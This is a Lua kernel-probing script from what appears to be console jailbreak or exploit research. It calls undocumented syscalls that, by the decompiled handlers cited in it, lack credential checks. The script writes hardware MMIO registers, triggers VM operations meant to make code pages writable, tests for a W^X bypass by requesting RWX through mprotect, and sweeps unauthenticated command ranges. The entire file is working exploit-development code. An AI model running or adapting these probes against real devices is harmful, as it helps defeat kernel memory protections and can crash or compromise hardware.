-- CRASH_CLASS: MODERATE
-- PROBE 99a: sys 617 hardware MMIO write + sys 620 VM self-modification
--
-- TWO never-tested vectors from decompiled handler analysis:
--
-- sys 617 — DIRECT HARDWARE REGISTER WRITER
--   1 arg: low byte only
--   NO credential check in root body
--   Global predicate gate: (~global[0x8e681390]) & 1
--   If gate passes: translates byte through lookup table at 0xbd79ee0,
--   then writes result to MMIO base+0x25310 (or x86 "out dx,eax")
--   Hardware registers control GPU/display/power/security
--
-- sys 620 — KERNEL VM OPERATION ON RETURN-ADDRESS PAGE
--   0 args (reads from trap frame)
--   NO credential check, NO arguments
--   Loads saved RIP from td->trapframe+0x100
--   Calculates (saved_address - 0x80) & ~0x3fff (16KB page alignment)
--   Calls VM operation with MODE 5 on that page
--   If mode 5 = attribute change → code page becomes writable!
--
-- Section A: sys 617 reachability + byte value sweep
-- Section B: sys 620 reachability + protection observation
-- Section C: sys 620 + mprotect retest (check if page attrs changed)
-- Section D: sys 622 unauthenticated commands (0x200-0x270 with arg3 copyin)

local TEST_SECTION = TEST_SECTION or "A"

print("=== PROBE 99a: HW WRITE + VM SELF-MOD ===")
print("Section: " .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end

local sc617 = make_syscall(617)
local sc620 = make_syscall(620)
local sc622 = make_syscall(622)
local sc547 = make_syscall(547)   -- VM region query
local sc74  = make_syscall(74)    -- mprotect
local sc477 = make_syscall(477)   -- mmap
local sc624 = make_syscall(624)   -- VM op counter
local sc20  = make_syscall(20)    -- getpid

if TEST_SECTION == "A" then
    print("--- Section A: sys 617 hardware register writer ---")
    print("  1 arg (low byte). NO credential check in body.")
    print("  Writes to MMIO base+0x25310 via translated byte")
    print("")

    -- Baseline
    local ok, pid = pcall(function() return sc20() end)
    print("[A1] PID=" .. (ok and fmt(pid) or "FAIL"))
    ok, rv = pcall(function() return sc624() end)
    print("  VM counter=" .. (ok and fmt(rv) or "FAIL"))
    print("")

    -- sys 617 returns 0 unconditionally (root discards setter status)
    -- So ret=0 doesn't mean the write happened, but PCALL-FAIL means crash
    print("[A2] sys 617 reachability sweep:")
    local test_bytes = {0, 1, 2, 0x0F, 0x10, 0x20, 0x40, 0x80, 0xFF}
    for _, val in ipairs(test_bytes) do
        ok, rv = pcall(function()
            return sc617(uint64(val))
        end)
        if ok then
            print(string.format("  byte=0x%02X: ret=%s", val, fmt(rv)))
        else
            print(string.format("  byte=0x%02X: PCALL-FAIL", val))
        end
    end
    print("")

    -- The predicate gate checks: if some condition, load byte, translate, write
    -- Return is always 0. We need side effects to detect writes.
    -- Side effect: hardware state change. Observable via:
    -- 1. Display output changes
    -- 2. GPU behavior changes
    -- 3. Other syscall behavior changes

    -- Test if VM counter changes (would indicate kernel-side effects)
    print("[A3] VM counter after sys 617 calls:")
    ok, rv = pcall(function() return sc624() end)
    print("  VM counter=" .. (ok and fmt(rv) or "FAIL"))
    print("")

    -- Try with larger values to see if only low byte matters
    print("[A4] Full-width arg test:")
    local wide_vals = {0x100, 0x1FF, 0x10000, 0xFFFF, 0xDEAD}
    for _, val in ipairs(wide_vals) do
        ok, rv = pcall(function()
            return sc617(uint64(val))
        end)
        if ok then
            print(string.format("  arg=0x%X: ret=%s", val, fmt(rv)))
        else
            print(string.format("  arg=0x%X: PCALL-FAIL", val))
        end
    end
    print("")

    -- Stability check
    print("[A5] Post-test stability:")
    ok, rv = pcall(function() return sc20() end)
    print("  PID=" .. (ok and fmt(rv) or "FAIL"))

    print("")
    print("[DONE] Section A complete")

elseif TEST_SECTION == "B" then
    print("--- Section B: sys 620 VM self-modification ---")
    print("  0 args. NO credential check.")
    print("  Derives 16KB page from saved RIP, calls VM op mode 5")
    print("")

    -- Get eboot base for reference
    local pipe_str = tostring(syscall.pipe)
    local eboot_str = pipe_str:match("eboot%.bin @ (0x[0-9a-fA-F]+)")
    print("[B1] eboot base: " .. (eboot_str or "unknown"))
    print("")

    -- Query protection of eboot code page BEFORE sys 620
    local out = memory.alloc(0x40)
    if eboot_str then
        print("[B2] VM region query on eboot .text BEFORE sys 620:")
        for i = 0, 0xF do safe_wd(out + i * 4, 0) end
        local ok, rv = pcall(function()
            return sc547(uint64(eboot_str), uint64(out))
        end)
        if ok and to_num(rv) == 0 then
            for i = 0, 2 do
                local val = safe_rq(out + i * 8)
                print(string.format("    +0x%02X: %s", i * 8, val and fmt(val) or "nil"))
            end
        else
            print("    ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
        end
        print("")
    end

    -- VM counter baseline
    local ok, counter_before = pcall(function() return sc624() end)
    print("[B3] VM counter BEFORE: " .. (ok and fmt(counter_before) or "FAIL"))
    print("")

    -- Call sys 620 (zero args, reads from trap frame)
    print("[B4] Calling sys 620:")
    ok, rv = pcall(function()
        return sc620()
    end)
    print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
    print("")

    -- VM counter AFTER — if it changed, sys 620 performed a VM operation
    local ok2, counter_after = pcall(function() return sc624() end)
    print("[B5] VM counter AFTER: " .. (ok2 and fmt(counter_after) or "FAIL"))
    if ok and ok2 then
        local diff = to_num(counter_after) - to_num(counter_before)
        if diff ~= 0 then
            print("  *** VM COUNTER CHANGED BY " .. diff .. " — VM OPERATION HAPPENED! ***")
        else
            print("  (no change — operation may have failed silently)")
        end
    end
    print("")

    -- Query protection AFTER sys 620
    if eboot_str then
        print("[B6] VM region query on eboot .text AFTER sys 620:")
        for i = 0, 0xF do safe_wd(out + i * 4, 0) end
        ok, rv = pcall(function()
            return sc547(uint64(eboot_str), uint64(out))
        end)
        if ok and to_num(rv) == 0 then
            for i = 0, 2 do
                local val = safe_rq(out + i * 8)
                print(string.format("    +0x%02X: %s", i * 8, val and fmt(val) or "nil"))
            end
        else
            print("    ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
        end
    end
    print("")

    -- Multiple calls to see cumulative effect
    print("[B7] Rapid sys 620 x5:")
    for i = 1, 5 do
        ok, rv = pcall(function() return sc620() end)
        print(string.format("  call %d: ret=%s", i, ok and fmt(rv) or "FAIL"))
    end
    ok, rv = pcall(function() return sc624() end)
    print("  VM counter final: " .. (ok and fmt(rv) or "FAIL"))

    print("")
    print("[DONE] Section B complete")

elseif TEST_SECTION == "C" then
    print("--- Section C: sys 620 + mprotect retest ---")
    print("  If sys 620 mode 5 changed page attrs, mprotect might behave differently")
    print("")

    -- Get eboot base
    local pipe_str = tostring(syscall.pipe)
    local eboot_str = pipe_str:match("eboot%.bin @ (0x[0-9a-fA-F]+)")
    print("[C1] eboot base: " .. (eboot_str or "unknown"))

    -- GPU mmap for test
    local ok, gpu = pcall(function()
        return sc477(uint64(0), uint64(16 * 0x4000), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    print("  GPU addr: " .. (ok and fmt(gpu) or "FAIL"))
    print("")

    -- Baseline: mprotect GPU pages to RWX (should fail due to W^X)
    print("[C2] mprotect RWX on GPU BEFORE sys 620:")
    if ok then
        local ok2, rv = pcall(function()
            return sc74(uint64(gpu), uint64(0x4000), uint64(7))
        end)
        print("  ret=" .. (ok2 and fmt(rv) or "PCALL-FAIL"))
        print("  (expect -1 due to W^X)")
    end
    print("")

    -- Call sys 620 multiple times
    print("[C3] Calling sys 620 x3:")
    for i = 1, 3 do
        local ok3, rv = pcall(function() return sc620() end)
        print(string.format("  call %d: ret=%s", i, ok3 and fmt(rv) or "FAIL"))
    end
    print("")

    -- Retry mprotect RWX
    print("[C4] mprotect RWX on GPU AFTER sys 620:")
    if ok then
        local ok2, rv = pcall(function()
            return sc74(uint64(gpu), uint64(0x4000), uint64(7))
        end)
        print("  ret=" .. (ok2 and fmt(rv) or "PCALL-FAIL"))
        if ok2 and to_num(rv) == 0 then
            print("  *** W^X BYPASS! RWX GRANTED! ***")

            -- Verify by writing and reading
            safe_wd(gpu, 0x41414141)
            local val = safe_rd(gpu)
            print("  RW verify: " .. (val == 0x41414141 and "OK" or "FAIL"))
        end
    end
    print("")

    -- Also try mprotect(EXEC) on GPU pages (R+X, no W)
    print("[C5] mprotect R+X on GPU:")
    if ok then
        local ok2, rv = pcall(function()
            return sc74(uint64(gpu), uint64(0x4000), uint64(5))
        end)
        print("  ret=" .. (ok2 and fmt(rv) or "PCALL-FAIL"))
        if ok2 and to_num(rv) == 0 then
            print("  *** EXEC PERMISSION GRANTED! ***")
        end
    end

    print("")
    print("[DONE] Section C complete")

elseif TEST_SECTION == "D" then
    print("--- Section D: sys 622 unauthenticated cmds (arg3 copyin) ---")
    print("  300+ commands have NO auth. Previous test used wrong arg layout?")
    print("  Correct layout: arg0=cmd, arg1=subcmd, arg2=buf, arg3=copyin_src, arg4=size")
    print("")

    -- Setup buffers
    local outbuf = memory.alloc(0x100)
    local inbuf = memory.alloc(0x100)
    for i = 0, 0x3F do
        safe_wd(outbuf + i * 4, 0xDEADDEAD)
        safe_wd(inbuf + i * 4, 0)
    end

    -- Test unauthenticated 0x200 range with correct arg layout
    -- arg3 = copyin source (user pointer), arg4 = size (max 0x40)
    print("[D1] sys 622 cmd 0x200 range (correct arg3 copyin):")
    local test_cmds = {0x200, 0x201, 0x202, 0x203, 0x204, 0x205,
                       0x210, 0x220, 0x230, 0x240, 0x250, 0x260, 0x270}
    for _, cmd in ipairs(test_cmds) do
        -- Reset output sentinel
        safe_wd(outbuf, 0xDEADDEAD)

        local ok, rv = pcall(function()
            return sc622(uint64(cmd), uint64(0), uint64(outbuf),
                         uint64(inbuf), uint64(0x40), uint64(0))
        end)
        local ret = ok and to_num(rv) or 0
        local out0 = safe_rd(outbuf) or 0

        if ok then
            local ret_hex = string.format("0x%X", ret)
            local modified = (out0 ~= 0xDEADDEAD)
            print(string.format("  cmd=0x%03X: ret=%s out[0]=0x%08X%s",
                cmd, ret_hex, out0,
                modified and " *** MODIFIED ***" or ""))
        else
            print(string.format("  cmd=0x%03X: PCALL-FAIL", cmd))
        end
    end
    print("")

    -- Test 0x400 range
    print("[D2] sys 622 cmd 0x400 range:")
    local test_cmds2 = {0x400, 0x401, 0x410, 0x420, 0x430, 0x440,
                        0x450, 0x460, 0x470, 0x480, 0x490, 0x493}
    for _, cmd in ipairs(test_cmds2) do
        safe_wd(outbuf, 0xDEADDEAD)
        local ok, rv = pcall(function()
            return sc622(uint64(cmd), uint64(0), uint64(outbuf),
                         uint64(inbuf), uint64(0x40), uint64(0))
        end)
        local ret = ok and to_num(rv) or 0
        local out0 = safe_rd(outbuf) or 0
        if ok then
            print(string.format("  cmd=0x%03X: ret=0x%X out[0]=0x%08X",
                cmd, ret, out0))
        else
            print(string.format("  cmd=0x%03X: PCALL-FAIL", cmd))
        end
    end
    print("")

    -- Test special 0x813 path
    print("[D3] sys 622 cmd 0x813 (special path):")
    safe_wd(outbuf, 0xDEADDEAD)
    local ok, rv = pcall(function()
        return sc622(uint64(0x813), uint64(0), uint64(outbuf),
                     uint64(inbuf), uint64(0x40), uint64(0))
    end)
    print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
    if ok then
        local out0 = safe_rd(outbuf) or 0
        print("  out[0]=0x" .. string.format("%08X", out0))
    end
    print("")

    -- Test 0x520 direct-call command
    print("[D4] sys 622 cmd 0x520 (direct call, no auth):")
    safe_wd(outbuf, 0xDEADDEAD)
    ok, rv = pcall(function()
        return sc622(uint64(0x520), uint64(0), uint64(outbuf),
                     uint64(inbuf), uint64(0x40), uint64(0))
    end)
    print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))

    print("")

    -- Stability
    print("[D5] Stability:")
    ok, rv = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok and fmt(rv) or "FAIL"))

    print("")
    print("[DONE] Section D complete")
end

print("")
print("=== PROBE 99a COMPLETE ===")
